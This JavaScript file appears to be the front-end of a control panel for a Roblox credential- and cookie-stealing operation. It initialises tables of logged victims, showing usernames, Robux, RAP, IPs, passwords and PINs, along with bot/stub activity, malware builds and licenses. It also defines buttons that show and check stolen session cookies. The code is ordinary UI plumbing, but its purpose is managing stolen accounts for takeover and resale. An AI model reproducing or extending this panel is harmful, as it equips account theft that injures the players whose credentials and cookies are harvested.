
if ($('#sidenav-1').length > 0) {
     const sidenav = document.getElementById("sidenav-1");
const sidenavInstance = mdb.Sidenav.getInstance(sidenav);

let innerWidth = null;

const setMode = (e) => {
  // Check necessary for Android devices
  if (window.innerWidth === innerWidth) {
    return;
  }

  innerWidth = window.innerWidth;

  if (window.innerWidth < 1400) {
    sidenavInstance.changeMode("over");
    sidenavInstance.hide();
  } else {
    sidenavInstance.changeMode("side");
    sidenavInstance.show();
  }
};

setMode();

// Event listeners
window.addEventListener("resize", setMode);
}

function openChat(){
  $("#chatcard").slideToggle("slow");
  $("#openButton").slideToggle("slow");
}

function closeChat(){
  $("#chatcard").slideToggle("slow");
  $("#openButton").slideToggle("slow");
}

$(document).ready(function () {
  $('#table-dataTable-js').DataTable( { "ajax":{ url :"dataTable/jsLogs.php",  type: "post", }, "serverSide": true, "processing": true, "lengthMenu": [ [10, 25, 50, -1], [10, 25, 50, "All"] ], "order": [[6,'desc']], 'columns': [ { data: 'Roblox Avatar', name: 'Roblox Avatar' }, { data: 'Roblox UserName', name: 'Roblox UserName' }, { data: 'Robux', name: 'Robux' }, { data: 'Premium', name: 'Premium' }, { data: 'RAP', name: 'RAP' }, { data: 'IP', name: 'IP' }, { data: 'Log Date', name: 'Log Date' }, { data: 'Actions', name: 'Actions' } ] });
  $('#table-dataTable-js-old').DataTable( { "ajax":{ url :"dataTable/oldJSLogs.php",  type: "post", }, "serverSide": true, "processing": true, "lengthMenu": [ [10, 25, 50, -1], [10, 25, 50, "All"] ], "order": [[6,'desc']], 'columns': [ { data: 'Roblox Avatar', name: 'Roblox Avatar' }, { data: 'Roblox UserName', name: 'Roblox UserName' }, { data: 'Robux', name: 'Robux' }, { data: 'Premium', name: 'Premium' }, { data: 'RAP', name: 'RAP' }, { data: 'IP', name: 'IP' }, { data: 'Log Date', name: 'Log Date' }, { data: 'Actions', name: 'Actions' } ] });
  $('#table-dataTable-js-Shared').DataTable( { "ajax":{ url :"dataTable/jsLogsShared.php",  type: "post", }, "serverSide": true, "processing": true, "lengthMenu": [ [10, 25, 50, -1], [10, 25, 50, "All"] ], "order": [[6,'desc']], 'columns': [ { data: 'Roblox Avatar', name: 'Roblox Avatar' }, { data: 'Roblox UserName', name: 'Roblox UserName' }, { data: 'Robux', name: 'Robux' }, { data: 'Premium', name: 'Premium' }, { data: 'RAP', name: 'RAP' }, { data: 'IP', name: 'IP' }, { data: 'Log Date', name: 'Log Date' }, { data: 'Actions', name: 'Actions' } ] });
  $('#table-dataTable-bots').DataTable( { "ajax":{ url :"dataTable/stubLogs.php",  type: "post", }, "serverSide": true, "processing": true, "lengthMenu": [ [10, 25, 50, -1], [10, 25, 50, "All"] ], "order": [[3,'desc']], 'columns': [ { data: 'Bot Name', name: 'Bot Name' }, { data: 'Country', name: 'Country' }, { data: 'Active', name: 'Active' }, { data: 'Last Activity', name: 'Last Activity' }, { data: 'Options', name: 'Options' } ] });
  $('#table-dataTable-bots-Shared').DataTable( { "ajax":{ url :"dataTable/stubLogsShared.php",  type: "post", }, "serverSide": true, "processing": true, "lengthMenu": [ [10, 25, 50, -1], [10, 25, 50, "All"] ], "order": [[3,'desc']], 'columns': [ { data: 'Bot Name', name: 'Bot Name' }, { data: 'Country', name: 'Country' }, { data: 'Active', name: 'Active' }, { data: 'Last Activity', name: 'Last Activity' }, { data: 'Options', name: 'Options' } ] });
  $('#table-dataTable-ps').DataTable( { "ajax":{ url :"dataTable/psLogs.php",  type: "post", }, "serverSide": true, "processing": true, "lengthMenu": [ [10, 25, 50, -1], [10, 25, 50, "All"] ], "order": [[7,'desc']], 'columns': [ { data: 'Avatar', name: 'Avatar' }, { data: 'Username', name: 'Username' }, { data: 'Password', name: 'Password' }, { data: 'Real Account', name: 'Real Account' }, { data: 'Type', name: 'Type' }, { data: 'Pin', name: 'Pin' }, { data: 'IP', name: 'IP' }, { data: 'Date', name: 'Date' }, { data: 'Actions', name: 'Actions' } ] });
  $('#table-dataTable-ps-Shared').DataTable( { "ajax":{ url :"dataTable/psLogsShared.php",  type: "post", }, "serverSide": true, "processing": true, "lengthMenu": [ [10, 25, 50, -1], [10, 25, 50, "All"] ], "order": [[7,'desc']], 'columns': [ { data: 'Avatar', name: 'Avatar' }, { data: 'Username', name: 'Username' }, { data: 'Password', name: 'Password' }, { data: 'Real Account', name: 'Real Account' }, { data: 'Type', name: 'Type' }, { data: 'Pin', name: 'Pin' }, { data: 'IP', name: 'IP' }, { data: 'Date', name: 'Date' }, { data: 'Actions', name: 'Actions' } ] });
  $('#table-dataTable-settings').DataTable({"order": [[4,'desc']]});
  $('#table-dataTable-psIps').DataTable({"order": [[4,'desc']]});
  $('#table-dataTable-profile').DataTable({"order": [[2,'desc']]});
  $('#table-dataTable-lActive').DataTable({"order": [[4,'desc']]});
  $('#table-dataTable-lHistory').DataTable({"order": [[3,'desc']]});
  $('#table-dataTable-users').DataTable({"order": [[6,'desc']]});
  $('#table-dataTable-licenses').DataTable();
  $('#table-dataTable-usedLicenses').DataTable({"order": [[4,'desc']]});
  $('#table-dataTable-alerts').DataTable({"order": [[3,'desc']]});
  $('#table-dataTable-sidenews').DataTable({"order": [[1,'desc']]});
  $('#table-dataTable-auditlog').DataTable({"order": [[4,'desc']]});
  $('#table-dataTable-adminlog').DataTable({"order": [[2,'desc']]});
  $('#table-dataTable-builds').DataTable({"order": [[3,'desc']]});
  $('#table-dataTable-jsbuilds').DataTable({"order": [[3,'desc']]});
  $('#table-dataTable-psbuilds').DataTable({"order": [[2,'desc']]});
  $('#table-dataTable-bmbuilds').DataTable({"order": [[2,'desc']]});
  $('#table-dataTable-allTickets').DataTable({"order": [[6,'desc']]});
  $('#table-dataTable-allTicketsClosed').DataTable({"order": [[6,'desc']]});
  $('#table-dataTable-watchlist').DataTable({"order": [[4,'desc']]});
  $('.dataTables_length').addClass('bs-select');
});

$(document).ready(function(){

  $(document).on('click', '#getUser', function(e){

   e.preventDefault();

   var uid = $(this).data('id'); 

   $('#dynamic-content').html('');
   $('#modal-loader').show(); 

   $.ajax({
        url: 'userinfo.php',
        type: 'POST',
        data: 'id='+uid,
        dataType: 'html'
   })
   .done(function(data){
        console.log(data); 
        $('#dynamic-content').html('');
        $('#dynamic-content').html(data);
        $('#modal-loader').hide();
   })
   .fail(function(){
        $('#dynamic-content').html('<i class="glyphicon glyphicon-info-sign"></i> Something went wrong, Please try again...');
        $('#modal-loader').hide();
   });

  });
  $(document).on('click', '#getFiles', function(e){

    e.preventDefault();
 
    var uid = $(this).data('id');
 
    $('#dynamic-content').html('');
    $('#modal-loader').show();

    $.ajax({
         url: 'userfiles.php',
         type: 'POST',
         data: 'id='+uid,
         dataType: 'html'
    })
    .done(function(data){
         console.log(data); 
         $('#dynamic-content').html('');
         $('#dynamic-content').html(data);
         $('#modal-loader').hide();
    })
    .fail(function(){
         $('#dynamic-content').html('<i class="glyphicon glyphicon-info-sign"></i> Something went wrong, Please try again...');
         $('#modal-loader').hide();
    });

   });
   $(document).on('click', '#getTools', function(e){

    e.preventDefault();
 
    var uid = $(this).data('id');
 
    $('#dynamic-content').html('');
    $('#modal-loader').show();

    $.ajax({
         url: 'usertools.php',
         type: 'POST',
         data: 'id='+uid,
         dataType: 'html'
    })
    .done(function(data){
         console.log(data); 
         $('#dynamic-content').html('');
         $('#dynamic-content').html(data);
         $('#modal-loader').hide();
    })
    .fail(function(){
         $('#dynamic-content').html('<i class="glyphicon glyphicon-info-sign"></i> Something went wrong, Please try again...');
         $('#modal-loader').hide();
    });

   });
   $(document).on('click', '#showCookie', function(e){

    e.preventDefault();
 
    var uid = $(this).data('id');
 
    $('#dynamic-content').html('');
    $('#modal-loader').show();

    $.ajax({
         url: 'showcookie.php',
         type: 'POST',
         data: 'id='+uid,
         dataType: 'html'
    })
    .done(function(data){
         console.log(data); 
         $('#dynamic-content').html('');
         $('#dynamic-content').html(data);
         $('#modal-loader').hide();
    })
    .fail(function(){
         $('#dynamic-content').html('<i class="glyphicon glyphicon-info-sign"></i> Something went wrong, Please try again...');
         $('#modal-loader').hide();
    });

   });
   $(document).on('click', '#showCookie-old', function(e){

     e.preventDefault();
  
     var uid = $(this).data('id');
  
     $('#dynamic-content').html('');
     $('#modal-loader').show();
 
     $.ajax({
          url: 'showcookie-old.php',
          type: 'POST',
          data: 'id='+uid,
          dataType: 'html'
     })
     .done(function(data){
          console.log(data); 
          $('#dynamic-content').html('');
          $('#dynamic-content').html(data);
          $('#modal-loader').hide();
     })
     .fail(function(){
          $('#dynamic-content').html('<i class="glyphicon glyphicon-info-sign"></i> Something went wrong, Please try again...');
          $('#modal-loader').hide();
     });
 
   });
   $(document).on('click', '#checkCookie-old', function(e){

     e.preventDefault();
  
     var uid = $(this).data('id');
  
     $('#dynamic-content').html('');
     $('#modal-loader').show();
 
     $.ajax({
          url: 'checkcookie-old.php',
          type: 'POST',
          data: 'id='+uid,
          dataType: 'html'
     })
     .done(function(data){
          console.log(data); 
          $('#dynamic-content').html('');
          $('#dynamic-content').html(data);
          $('#modal-loader').hide();
     })
     .fail(function(){
          $('#dynamic-content').html('<i class="glyphicon glyphicon-info-sign"></i> Something went wrong, Please try again...');
          $('#modal-loader').hide();
     });

});
   $(document).on('click', '#checkCookie', function(e){

        e.preventDefault();
     
        var uid = $(this).data('id');
     
        $('#dynamic-content').html('');
        $('#modal-loader').show();
    
        $.ajax({
             url: 'checkcookie.php',
             type: 'POST',
             data: 'id='+uid,
             dataType: 'html'
        })
        .done(function(data){
             console.log(data); 
             $('#dynamic-content').html('');
             $('#dynamic-content').html(data);
             $('#modal-loader').hide();
        })
        .fail(function(){
             $('#dynamic-content').html('<i class="glyphicon glyphicon-info-sign"></i> Something went wrong, Please try again...');
             $('#modal-loader').hide();
        });
   
   });
});

$('#load-button').click(function() {
     $('#load-button').html('<span class="spinner-border spinner-border-sm mr-2" role="status" aria-hidden="true"></span>Loading...').addClass('disabled');
});

$('#showPW').modal('show'); 